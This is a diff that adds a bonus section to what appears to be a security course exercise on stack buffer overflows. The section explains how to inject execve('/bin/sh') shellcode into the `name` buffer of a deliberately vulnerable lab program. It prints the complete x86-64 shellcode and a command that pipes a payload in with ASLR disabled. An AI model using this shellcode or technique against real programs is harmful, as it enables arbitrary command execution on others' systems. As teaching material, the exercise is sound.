@@ -327,3 +327,52 @@ In the disassembly you can find the required address and the location of the
 buffer `name` relative to the base pointer.
 
 </details>
+
+
+### Bonus Part 3: Executing Shellcode
+
+In `overflow3.c` the `win` function has disappeared.
+Luckily, the stack is now executable, so we can inject our own code into the `name` buffer and execute it.
+
+We want to use the syscall `execve` to spawn a shell so that we can execute arbitrary commands.
+```c
+execve("/bin/sh", {NULL}, {NULL});
+```
+You can find information on `execve` on its [manpage of the C wrapper
+function](https://man.archlinux.org/man/execve.2) and in the [syscall
+reference](https://filippo.io/linux-syscall-table/).
+
+Try to understand the following shellcode which executes the systemcall:
+```nasm
+# store b'/bin/sh\0' on the stack
+mov rax, 0x68732f6e69622f
+push rax
+# load a pointer to the string into rdi
+mov rdi, rsp
+# store a NULL pointer on the stack
+xor rax, rax
+push rax
+# load a pointer to the null pointer into rsi and rdx
+mov rsi, rsp
+mov rdx, rsp
+# load the syscall number of execve into rax
+mov rax, 0x3b
+# execute the syscall
+syscall
+```
+You can for example use the [Online
+Assembler](https://defuse.ca/online-x86-assembler.htm) (remember to select
+"x64") to assemble the shellcode to obtain executable machine code.
+
+To complete the exploit, we still need the address where we want to jump, i.e.,
+the address of the shellcode inside the `name` buffer.
+The program is nice enough to print the address of `name` to us, and if you run
+it with the command `setarch $(uname -m) -R ./overflow3`, then ASLR is disabled
+and the address stays the same in each execution.
+
+```
+(python -c "import os, struct; os.write(1, b'<write your payload here>)"; cat) | setarch $(uname -m) -R ./overflow3
+```
+If everything works, you should land in a newly spawned shell (the `cat` is
+necessary to prevent the shell from getting immediately closed again).
+Try executing commands.
